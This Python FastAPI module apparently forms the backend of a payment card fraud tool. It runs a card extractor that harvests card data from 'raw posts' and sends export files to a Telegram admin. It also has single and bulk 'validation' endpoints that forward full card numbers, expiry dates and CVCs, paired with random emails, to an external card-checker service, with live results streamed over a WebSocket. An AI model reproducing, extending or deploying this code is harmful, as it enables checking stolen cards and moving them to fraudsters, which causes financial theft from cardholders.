"""
Card Extraction & Export API — including bulk validation with WebSocket real-time updates.
"""

import asyncio
import json
import random
import logging
from typing import Any, List

import httpx
from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect, Query
from pydantic import BaseModel
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import get_current_user
from app.database import get_db, AsyncSessionLocal
from app.models.user import User
from app.models.job import Job, JobStatus, JobType

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/cards", tags=["Cards"])

# External card-checker service
_XVPN_API_URL = (
    "https://app-8019ea8b-dd0e-4d7b-9db5-60b717d474ab.cleverapps.io"
    "/api/v1/xvpn?timeout_ms=45000"
)


# ─── Schemas ─────────────────────────────────────────────────────────────────

class CardSettingsResponse(BaseModel):
    extractor_enabled: bool
    daily_export_enabled: bool
    db_connected: bool
    raw_posts: int
    extracted_cards: int
    card_db_url_set: bool


class CardSettingsUpdate(BaseModel):
    extractor_enabled: bool
    daily_export_enabled: bool


class SendNowResponse(BaseModel):
    status: str


# ─── Extractor Settings Endpoints ────────────────────────────────────────────

@router.get("/settings", response_model=CardSettingsResponse)
async def get_card_settings(_: User = Depends(get_current_user)):
    """Return card extractor settings + live PostgreSQL stats."""
    from app.services.card_export_service import card_export_service
    from app.extractor.card_service import get_card_stats
    from app.config import get_settings

    cfg = await card_export_service.get_settings()
    stats = await get_card_stats()
    env = get_settings()

    return CardSettingsResponse(
        extractor_enabled=cfg.extractor_enabled,
        daily_export_enabled=cfg.daily_export_enabled,
        db_connected=stats["db_connected"],
        raw_posts=stats["raw_posts"],
        extracted_cards=stats["extracted_cards"],
        card_db_url_set=bool(env.CARD_DB_URL),
    )


@router.put("/settings", response_model=CardSettingsResponse)
async def update_card_settings(
    body: CardSettingsUpdate,
    _: User = Depends(get_current_user),
):
    """Toggle extractor and/or daily export."""
    from app.services.card_export_service import card_export_service

    await card_export_service.save_settings(
        extractor_enabled=body.extractor_enabled,
        daily_export_enabled=body.daily_export_enabled,
    )
    return await get_card_settings()


@router.post("/send-now", response_model=SendNowResponse)
async def send_now(_: User = Depends(get_current_user)):
    """Immediately dispatch the two export files to Telegram admin."""
    from app.services.card_export_service import card_export_service

    cfg = await card_export_service.get_settings()
    if not cfg.extractor_enabled:
        raise HTTPException(400, "Card extractor is not enabled.")

    asyncio.create_task(card_export_service._send_export())
    return {"status": "Export dispatched — check Telegram in a few seconds."}


# ─── Single Card Validator ────────────────────────────────────────────────────

class CardValidateRequest(BaseModel):
    card_raw: str
    email: str = "olddealers@gmail.com"


@router.post("/validate")
async def validate_card(
    body: CardValidateRequest,
    _: User = Depends(get_current_user),
) -> Any:
    """Parse pipe-delimited card and proxy to the external checker service."""
    parts = [p.strip() for p in body.card_raw.split("|")]
    if len(parts) != 4:
        raise HTTPException(422, "card_raw must be in the format: CARDNUMBER|MM|YY|CVC")

    card_number, exp_month, exp_year, cvc = parts
    payload = {
        "email": body.email,
        "cardnumber": card_number,
        "cardExpiry": f"{exp_month} / {exp_year}",
        "cvc": cvc,
    }

    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.post(
                _XVPN_API_URL,
                json=payload,
                headers={"accept": "application/json", "Content-Type": "application/json"},
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.HTTPStatusError as exc:
        raise HTTPException(exc.response.status_code, f"Checker service error: {exc.response.text[:400]}")
    except httpx.RequestError as exc:
        raise HTTPException(502, f"Could not reach checker service: {exc}")


# ─── Bulk Validation ──────────────────────────────────────────────────────────

class BulkValidateRequest(BaseModel):
    cards: List[str]
    emails: List[str]


@router.post("/bulk-validate")
async def start_bulk_validate(
    body: BulkValidateRequest,
    db: AsyncSession = Depends(get_db),
    _: User = Depends(get_current_user),
):
    """Create a VALIDATE_CARDS job with per-card result rows and launch background runner."""
    from app.models.card_validation import CardValidationResult

    if not body.cards:
        raise HTTPException(400, "No cards provided")
    if not body.emails:
        raise HTTPException(400, "No emails provided")

    cards = [c.strip() for c in body.cards if c.strip()]
    emails = [e.strip() for e in body.emails if e.strip()]

    if not cards:
        raise HTTPException(400, "No valid cards after cleaning")

    parent_job = Job(
        job_type=JobType.VALIDATE_CARDS,
        status=JobStatus.PENDING,
        total_items=len(cards),
        processed_items=0,
        failed_items=0,
        phase="Bulk Card Validation",
    )
    db.add(parent_job)
    await db.flush()
    await db.refresh(parent_job)
    job_id = parent_job.id

    for card_raw in cards:
        parts = [p.strip() for p in card_raw.split("|")]
        card_number = exp_month = exp_year = cvc = None
        if len(parts) == 4:
            card_number, exp_month, exp_year, cvc = parts

        row = CardValidationResult(
            job_id=job_id,
            card_raw=card_raw,
            email=random.choice(emails),
            card_number=card_number,
            exp_month=exp_month,
            exp_year=exp_year,
            cvc=cvc,
            status="pending",
        )
        db.add(row)

    await db.commit()

    from app.services.bulk_card_service import run_bulk_validation
    asyncio.create_task(run_bulk_validation(job_id))

    return {"job_id": job_id, "total": len(cards)}


@router.get("/bulk-validate/{job_id}/results")
async def get_bulk_results(
    job_id: int,
    db: AsyncSession = Depends(get_db),
    _: User = Depends(get_current_user),
):
    """Return current result snapshot for a bulk validation job (REST fallback)."""
    from app.models.card_validation import CardValidationResult

    job_row = await db.execute(select(Job).where(Job.id == job_id))
    job = job_row.scalar_one_or_none()
    if not job:
        raise HTTPException(404, "Job not found")

    rows = (
        await db.execute(
            select(CardValidationResult)
            .where(CardValidationResult.job_id == job_id)
            .order_by(CardValidationResult.id)
        )
    ).scalars().all()

    return {
        "job_id": job_id,
        "job_status": job.status,
        "total": job.total_items,
        "processed": job.processed_items,
        "failed": job.failed_items,
        "results": [
            {
                "id": r.id,
                "card_raw": r.card_raw,
                "card_number": r.card_number,
                "email": r.email,
                "status": r.status,
                "all_steps_ok": r.all_steps_ok,
                "steps_passed": r.steps_passed,
                "steps_total": r.steps_total,
                "elapsed_ms": r.elapsed_ms,
                "error_message": r.error_message,
                "completed_at": r.completed_at.isoformat() if r.completed_at else None,
            }
            for r in rows
        ],
    }


# ─── WebSocket — real-time updates ───────────────────────────────────────────

@router.websocket("/bulk-validate/{job_id}/ws")
async def bulk_validate_ws(
    job_id: int,
    websocket: WebSocket,
    token: str = Query(...),
):
    """
    WebSocket for live card validation progress.
    Auth: pass the JWT as ?token=<jwt> query param (browsers cannot send
    Authorization headers in WebSocket upgrade requests).
    """
    from app.api.deps import verify_token_string

    user = await verify_token_string(token)
    if not user:
        await websocket.close(code=4001, reason="Unauthorized")
        return

    await websocket.accept()

    from app.services.bulk_card_service import register_ws, unregister_ws
    q = register_ws(job_id)

    # ── Send initial snapshot ─────────────────────────────────────────────────
    try:
        async with AsyncSessionLocal() as db:
            from app.models.card_validation import CardValidationResult

            job_row = await db.execute(select(Job).where(Job.id == job_id))
            job = job_row.scalar_one_or_none()

            rows = (
                await db.execute(
                    select(CardValidationResult)
                    .where(CardValidationResult.job_id == job_id)
                    .order_by(CardValidationResult.id)
                )
            ).scalars().all()

        snapshot = {
            "type": "snapshot",
            "job_id": job_id,
            "job_status": job.status if job else "unknown",
            "total": job.total_items if job else 0,
            "processed": job.processed_items if job else 0,
            "failed": job.failed_items if job else 0,
            "results": [
                {
                    "id": r.id,
                    "card_raw": r.card_raw,
                    "card_number": r.card_number,
                    "email": r.email,
                    "status": r.status,
                    "all_steps_ok": r.all_steps_ok,
                    "steps_passed": r.steps_passed,
                    "steps_total": r.steps_total,
                    "elapsed_ms": r.elapsed_ms,
                    "error_message": r.error_message,
                    "steps": [],
                }
                for r in rows
            ],
        }
        await websocket.send_text(json.dumps(snapshot))
    except Exception as exc:
        logger.error("WS snapshot error: %s", exc)

    # ── Stream events ─────────────────────────────────────────────────────────
    try:
        while True:
            try:
                msg = await asyncio.wait_for(q.get(), timeout=25.0)
                await websocket.send_text(msg)
            except asyncio.TimeoutError:
                # keepalive
                await websocket.send_text(json.dumps({"type": "ping"}))
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        logger.debug("WS connection closed: %s", exc)
    finally:
        unregister_ws(job_id, q)
